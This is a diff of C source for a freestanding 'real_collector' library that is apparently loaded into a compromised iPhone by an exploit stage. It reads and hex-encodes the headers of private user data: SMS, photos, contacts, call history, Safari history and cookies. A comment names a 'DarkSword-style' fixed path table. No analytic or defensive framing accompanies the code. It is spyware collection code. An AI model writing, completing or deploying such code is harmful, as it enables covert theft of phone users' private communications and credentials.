@@ -1,16 +1,17 @@
-/*
- * real_collector v2 — freestanding, manual-mapped by Stage3
- * No libc imports. JS FEED resolves open/read/close via ImageList, then:
- *   cmd:setapis:open=0x..,read=0x..,close=0x..
- *   cmd:read_head:/path
- *   cmd:read_fixed
- * No opendir / readdir.
+﻿/*
+ * real_collector v3 — freestanding, manual-mapped (RX safe)
+ * NEVER write static/global for APIs (mapped page may be RX-only).
+ * Every cmd carries open/read/close pointers; locals on stack only.
+ *
+ * Commands:
+ *   ping
+ *   rh:o=0x..,r=0x..,c=0x..,p=/path     (read head 32 bytes hex)
+ *   rf:o=0x..,r=0x..,c=0x..             (fixed path table heads)
  * Export: process -> _process
  */
 
 typedef unsigned int uint32_t;
 typedef unsigned char uint8_t;
-typedef long long int64_t;
 typedef unsigned long long uint64_t;
 typedef unsigned long uintptr_t;
 
@@ -18,28 +19,18 @@ typedef unsigned long uintptr_t;
 #define STATE_EXIT  5
 #define STATE_FEED  6
 
-/* function pointers filled by setapis (JS-resolved) */
 typedef int (*fn_open_t)(const char *path, int flags, ...);
 typedef long long (*fn_read_t)(int fd, void *buf, unsigned long n);
 typedef int (*fn_close_t)(int fd);
 
-static fn_open_t  g_open = 0;
-static fn_read_t  g_read = 0;
-static fn_close_t g_close = 0;
-static int g_apis_ok = 0;
-
-/* DarkSword-style fixed path table — no enumeration */
 static const char *const FIXED_PATHS[] = {
     "/private/var/mobile/Library/SMS/sms.db",
     "/var/mobile/Library/SMS/sms.db",
     "/private/var/mobile/Media/PhotoData/Photos.sqlite",
     "/var/mobile/Media/PhotoData/Photos.sqlite",
     "/private/var/mobile/Library/AddressBook/AddressBook.sqlitedb",
-    "/var/mobile/Library/AddressBook/AddressBook.sqlitedb",
     "/private/var/mobile/Library/CallHistoryDB/CallHistory.storedata",
-    "/var/mobile/Library/CallHistoryDB/CallHistory.storedata",
     "/private/var/mobile/Library/Safari/History.db",
-    "/var/mobile/Library/Safari/History.db",
     "/private/var/mobile/Library/Cookies/Cookies.binarycookies",
     "/System/Library/CoreServices/SystemVersion.plist",
     "/etc/hosts",
@@ -74,18 +65,9 @@ static int slen(const char *s) {
     return n;
 }
 
-static void scopy(char *d, const char *s, int max) {
-    int i = 0;
-    if (!d || max <= 0) return;
-    if (!s) { d[0] = 0; return; }
-    while (s[i] && i < max - 1) { d[i] = s[i]; i++; }
-    d[i] = 0;
-}
-
 static void buffer_set(uint32_t *D, const char *s) {
     uint8_t *p = (uint8_t *)(D + 2);
-    int i;
-    int n = slen(s);
+    int i, n = slen(s);
     if (n > 4095) n = 4095;
     for (i = 0; i < n; i++) p[i] = (uint8_t)s[i];
     p[n] = 0;
@@ -93,34 +75,12 @@ static void buffer_set(uint32_t *D, const char *s) {
     D[0] = STATE_READY;
 }
 
-/* append raw to out; returns new length */
 static int append_str(char *out, int off, int max, const char *s) {
     int i = 0;
     if (!out || !s || off < 0) return off;
-    while (s[i] && off + i < max - 1) {
-        out[off + i] = s[i];
-        i++;
-    }
+    while (s[i] && off + i < max - 1) { out[off + i] = s[i]; i++; }
     out[off + i] = 0;
     return off + i;
-}
-
-static int append_hex_u64(char *out, int off, int max, uint64_t v) {
-    const char *hex = "0123456789abcdef";
-    char tmp[20];
-    int n = 0, i;
-    if (v == 0) {
-        tmp[n++] = '0';
-    } else {
-        while (v && n < 16) {
-            tmp[n++] = hex[v & 0xf];
-            v >>= 4;
-        }
-    }
-    /* reverse */
-    for (i = n - 1; i >= 0 && off < max - 1; i--) out[off++] = tmp[i];
-    out[off] = 0;
-    return off;
 }
 
 static int append_int(char *out, int off, int max, long long v) {
@@ -128,17 +88,33 @@ static int append_int(char *out, int off, int max, long long v) {
     int n = 0, neg = 0, i;
     if (v < 0) { neg = 1; v = -v; }
     if (v == 0) tmp[n++] = '0';
-    while (v && n < 22) {
-        tmp[n++] = (char)('0' + (v % 10));
-        v /= 10;
-    }
+    while (v && n < 22) { tmp[n++] = (char)('0' + (v % 10)); v /= 10; }
     if (neg && off < max - 1) out[off++] = '-';
     for (i = n - 1; i >= 0 && off < max - 1; i--) out[off++] = tmp[i];
     out[off] = 0;
     return off;
 }
 
-/* parse hex after key= into pointer; accepts 0x prefix */
+static int append_hex_u64(char *out, int off, int max, uint64_t v) {
+    const char *hex = "0123456789abcdef";
+    char tmp[20];
+    int n = 0, i;
+    if (v == 0) tmp[n++] = '0';
+    else while (v && n < 16) { tmp[n++] = hex[v & 0xf]; v >>= 4; }
+    for (i = n - 1; i >= 0 && off < max - 1; i--) out[off++] = tmp[i];
+    out[off] = 0;
+    return off;
+}
+
+static int hex_byte(char *out, int off, int max, uint8_t b) {
+    const char *hex = "0123456789abcdef";
+    if (off + 2 >= max) return off;
+    out[off++] = hex[(b >> 4) & 0xf];
+    out[off++] = hex[b & 0xf];
+    out[off] = 0;
+    return off;
+}
+
 static uint64_t parse_hex_ptr(const char *s) {
     uint64_t v = 0;
     int i = 0;
@@ -156,7 +132,7 @@ static uint64_t parse_hex_ptr(const char *s) {
     return v;
 }
 
-/* find key= in setapis string, return value start or 0 */
+/* find key= value start; keys like o= r= c= p= */
 static const char *find_kv(const char *s, const char *key) {
     int kl = slen(key);
     int i = 0;
@@ -169,28 +145,47 @@ static const char *find_kv(const char *s, const char *key) {
     return 0;
 }
 
-static int hex_byte(char *out, int off, int max, uint8_t b) {
-    const char *hex = "0123456789abcdef";
-    if (off + 2 >= max) return off;
-    out[off++] = hex[(b >> 4) & 0xf];
-    out[off++] = hex[b & 0xf];
-    out[off] = 0;
-    return off;
+/* copy value until comma or end into dst */
+static void copy_val(const char *src, char *dst, int max) {
+    int i = 0;
+    if (!src || !dst || max <= 0) return;
+    while (src[i] && src[i] != ',' && i < max - 1) {
+        dst[i] = src[i];
+        i++;
+    }
+    dst[i] = 0;
 }
 
-/*
- * open/read head maxN bytes as hex JSON fragment into out
- * returns 1 if opened and read something (>=0), 0 on fail
- */
-static int try_read_head(const char *path, int maxN, char *out, int maxOut) {
+struct Apis {
+    fn_open_t o;
+    fn_read_t r;
+    fn_close_t c;
+};
+
+static int parse_apis(const char *args, struct Apis *a) {
+    char vb[32];
+    const char *vo, *vr, *vc;
+    a->o = 0; a->r = 0; a->c = 0;
+    vo = find_kv(args, "o");
+    if (!vo) vo = find_kv(args, "open");
+    vr = find_kv(args, "r");
+    if (!vr) vr = find_kv(args, "read");
+    vc = find_kv(args, "c");
+    if (!vc) vc = find_kv(args, "close");
+    if (vo) { copy_val(vo, vb, sizeof(vb)); a->o = (fn_open_t)(uintptr_t)parse_hex_ptr(vb); }
+    if (vr) { copy_val(vr, vb, sizeof(vb)); a->r = (fn_read_t)(uintptr_t)parse_hex_ptr(vb); }
+    if (vc) { copy_val(vc, vb, sizeof(vb)); a->c = (fn_close_t)(uintptr_t)parse_hex_ptr(vb); }
+    return (a->o && a->r && a->c) ? 1 : 0;
+}
+
+/* write one path result into out; stack only */
+static int try_read_head(struct Apis *a, const char *path, int maxN, char *out, int maxOut) {
     uint8_t buf[96];
     int fd, n, i, off = 0;
-    if (!g_apis_ok || !g_open || !g_read || !g_close) return 0;
-    if (!path || !out || maxOut < 32) return 0;
+    if (!a || !a->o || !a->r || !a->c || !path || !out) return 0;
     if (maxN > 64) maxN = 64;
     if (maxN < 1) maxN = 32;
-    /* O_RDONLY = 0 */
-    fd = g_open(path, 0);
+    fd = a->o(path, 0);
     if (fd < 0) {
         off = append_str(out, 0, maxOut, "{\"path\":\"");
         off = append_str(out, off, maxOut, path);
@@ -199,8 +194,8 @@ static int try_read_head(const char *path, int maxN, char *out, int maxOut) {
         off = append_str(out, off, maxOut, "}");
         return 0;
     }
-    n = (int)g_read(fd, buf, (unsigned long)maxN);
-    g_close(fd);
+    n = (int)a->r(fd, buf, (unsigned long)maxN);
+    a->c(fd);
     if (n < 0) n = 0;
     off = append_str(out, 0, maxOut, "{\"path\":\"");
     off = append_str(out, off, maxOut, path);
@@ -209,79 +204,56 @@ static int try_read_head(const char *path, int maxN, char *out, int maxOut) {
     off = append_str(out, off, maxOut, ",\"hex\":\"");
     for (i = 0; i < n; i++) off = hex_byte(out, off, maxOut, buf[i]);
     off = append_str(out, off, maxOut, "\"}");
-    return n > 0 ? 1 : 1; /* open ok counts as hit even empty */
+    return 1;
 }
 
-static void handle_setapis(uint32_t *D, const char *args) {
-    const char *o, *r, *c;
-    char msg[512];
+static void handle_rh(uint32_t *D, const char *args) {
+    struct Apis a;
+    char one[768], wrap[900], pathbuf[256];
+    const char *pp;
     int off = 0;
-    o = find_kv(args, "open");
-    r = find_kv(args, "read");
-    c = find_kv(args, "close");
-    if (o) g_open = (fn_open_t)(uintptr_t)parse_hex_ptr(o);
-    if (r) g_read = (fn_read_t)(uintptr_t)parse_hex_ptr(r);
-    if (c) g_close = (fn_close_t)(uintptr_t)parse_hex_ptr(c);
-    /* also accept without 0x via plain digits already handled */
-    g_apis_ok = (g_open && g_read && g_close) ? 1 : 0;
-    off = append_str(msg, 0, sizeof(msg),
-        "{\"ok\":");
-    off = append_str(msg, off, sizeof(msg), g_apis_ok ? "true" : "false");
-    off = append_str(msg, off, sizeof(msg),
-        ",\"source\":\"real_collector\",\"cmd\":\"setapis\",\"open\":\"");
-    off = append_hex_u64(msg, off, sizeof(msg), (uint64_t)(uintptr_t)g_open);
-    off = append_str(msg, off, sizeof(msg), "\",\"read\":\"");
-    off = append_hex_u64(msg, off, sizeof(msg), (uint64_t)(uintptr_t)g_read);
-    off = append_str(msg, off, sizeof(msg), "\",\"close\":\"");
-    off = append_hex_u64(msg, off, sizeof(msg), (uint64_t)(uintptr_t)g_close);
-    off = append_str(msg, off, sizeof(msg), "\"}");
-    buffer_set(D, msg);
-}
-
-static void handle_read_head(uint32_t *D, const char *path) {
-    char one[768];
-    char wrap[900];
-    int off = 0;
-    if (!g_apis_ok) {
-        buffer_set(D,
-            "{\"ok\":false,\"source\":\"real_collector\",\"cmd\":\"read_head\","
-            "\"error\":\"need_setapis\"}");
+    if (!parse_apis(args, &a)) {
+        buffer_set(D, "{\"ok\":false,\"source\":\"real_collector\",\"cmd\":\"rh\",\"error\":\"bad_apis\"}");
         return;
     }
-    try_read_head(path, 32, one, sizeof(one));
+    pp = find_kv(args, "p");
+    if (!pp) pp = find_kv(args, "path");
+    if (!pp) {
+        buffer_set(D, "{\"ok\":false,\"source\":\"real_collector\",\"cmd\":\"rh\",\"error\":\"no_path\"}");
+        return;
+    }
+    copy_val(pp, pathbuf, sizeof(pathbuf));
+    try_read_head(&a, pathbuf, 32, one, sizeof(one));
     off = append_str(wrap, 0, sizeof(wrap),
-        "{\"ok\":true,\"source\":\"real_collector\",\"cmd\":\"read_head\",\"item\":");
+        "{\"ok\":true,\"source\":\"real_collector\",\"cmd\":\"rh\",\"item\":");
     off = append_str(wrap, off, sizeof(wrap), one);
     off = append_str(wrap, off, sizeof(wrap), "}");
     buffer_set(D, wrap);
 }
 
-static void handle_read_fixed(uint32_t *D) {
-    char one[700];
-    char out[4090];
+static void handle_rf(uint32_t *D, const char *args) {
+    struct Apis a;
+    char one[700], out[4090];
     int i, off = 0, hits = 0, tried = 0;
-    if (!g_apis_ok) {
-        buffer_set(D,
-            "{\"ok\":false,\"source\":\"real_collector\",\"cmd\":\"read_fixed\","
-            "\"error\":\"need_setapis\"}");
+    if (!parse_apis(args, &a)) {
+        buffer_set(D, "{\"ok\":false,\"source\":\"real_collector\",\"cmd\":\"rf\",\"error\":\"bad_apis\"}");
         return;
     }
     off = append_str(out, 0, sizeof(out),
-        "{\"ok\":true,\"source\":\"real_collector\",\"cmd\":\"read_fixed\","
+        "{\"ok\":true,\"source\":\"real_collector\",\"cmd\":\"rf\","
         "\"method\":\"fixed_path_open_read\",\"items\":[");
     for (i = 0; FIXED_PATHS[i]; i++) {
         int ok;
         if (off > 3600) break;
         tried++;
-        ok = try_read_head(FIXED_PATHS[i], 32, one, sizeof(one));
+        ok = try_read_head(&a, FIXED_PATHS[i], 32, one, sizeof(one));
         if (tried > 1) off = append_str(out, off, sizeof(out), ",");
         off = append_str(out, off, sizeof(out), one);
-        if (ok && one[0] == '{' && sncmp(one, "{\"path\":", 8) == 0) {
-            /* count open-ok with ok:true */
-            const char *p = one;
+        if (ok) {
+            /* count ok:true */
             int j;
-            for (j = 0; p[j]; j++) {
-                if (sncmp(p + j, "\"ok\":true", 9) == 0) { hits++; break; }
+            for (j = 0; one[j]; j++) {
+                if (sncmp(one + j, "\"ok\":true", 9) == 0) { hits++; break; }
             }
         }
     }
@@ -309,50 +281,35 @@ int process(void *buffer) {
         if (payload[0] == 'c' && payload[1] == 'm' && payload[2] == 'd' && payload[3] == ':') {
             const char *cmd = (const char *)(payload + 4);
             if (scmp(cmd, "ping") == 0) {
-                char m[160];
-                int o = 0;
-                o = append_str(m, 0, sizeof(m),
+                buffer_set(D,
                     "{\"ok\":true,\"source\":\"real_collector\",\"cmd\":\"ping\","
-                    "\"note\":\"freestanding_v2\",\"apis\":");
-                o = append_str(m, o, sizeof(m), g_apis_ok ? "true" : "false");
-                o = append_str(m, o, sizeof(m), "}");
-                buffer_set(D, m);
+                    "\"note\":\"freestanding_v3\",\"apis\":\"inline\"}");
                 return 0;
             }
-            if (sncmp(cmd, "setapis:", 8) == 0) {
-                handle_setapis(D, cmd + 8);
+            if (sncmp(cmd, "rh:", 3) == 0) {
+                handle_rh(D, cmd + 3);
                 return 0;
             }
+            if (sncmp(cmd, "rf:", 3) == 0) {
+                handle_rf(D, cmd + 3);
+                return 0;
+            }
+            /* legacy aliases */
             if (sncmp(cmd, "read_head:", 10) == 0) {
-                handle_read_head(D, cmd + 10);
-                return 0;
-            }
-            if (scmp(cmd, "read_fixed") == 0) {
-                handle_read_fixed(D);
-                return 0;
-            }
-            /* legacy: still no opendir */
-            if (scmp(cmd, "list_dcim") == 0) {
                 buffer_set(D,
-                    "{\"ok\":false,\"source\":\"real_collector\",\"cmd\":\"list_dcim\","
-                    "\"error\":\"use_read_fixed_no_opendir\"}");
+                    "{\"ok\":false,\"source\":\"real_collector\",\"cmd\":\"read_head\","
+                    "\"error\":\"use_rh_with_inline_apis\"}");
                 return 0;
             }
-            if (sncmp(cmd, "list_dir:", 9) == 0) {
+            if (scmp(cmd, "read_fixed") == 0 || sncmp(cmd, "setapis:", 8) == 0) {
                 buffer_set(D,
-                    "{\"ok\":false,\"source\":\"real_collector\",\"cmd\":\"list_dir\","
-                    "\"error\":\"use_read_fixed_no_opendir\"}");
-                return 0;
-            }
-            if (sncmp(cmd, "read_file:", 10) == 0) {
-                /* alias to read_head */
-                handle_read_head(D, cmd + 10);
+                    "{\"ok\":false,\"source\":\"real_collector\",\"error\":\"use_rf_or_rh_v3\"}");
                 return 0;
             }
             if (scmp(cmd, "device_info") == 0) {
                 buffer_set(D,
                     "{\"ok\":true,\"source\":\"real_collector\",\"cmd\":\"device_info\","
-                    "\"mode\":\"freestanding_v2\"}");
+                    "\"mode\":\"freestanding_v3\"}");
                 return 0;
             }
             if (scmp(cmd, "exit") == 0) {
@@ -371,6 +328,6 @@ int process(void *buffer) {
 
     buffer_set(D,
         "{\"ok\":true,\"source\":\"real_collector\",\"event\":\"boot\","
-        "\"msg\":\"dylib_started\",\"mode\":\"freestanding_v2\"}");
+        "\"msg\":\"dylib_started\",\"mode\":\"freestanding_v3\"}");
     return 0;
 }
